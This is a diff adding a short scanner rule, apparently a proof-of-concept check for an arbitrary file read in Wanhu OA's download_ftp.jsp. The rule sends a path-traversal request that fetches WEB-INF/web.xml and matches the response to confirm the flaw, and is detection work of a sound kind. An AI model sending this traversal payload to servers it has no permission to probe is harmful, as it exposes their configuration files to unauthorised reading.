@@ -1,0 +1,8 @@
+name: wanhu-oa-download-ftp-file-read
+rules:
+  r0:
+    request:
+      method: GET
+      path: /defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml
+    expression: response.status == 200 && response.body.bcontains(b'<web-app') && response.body.bcontains(b'</web-app>') 
+expression: r0()
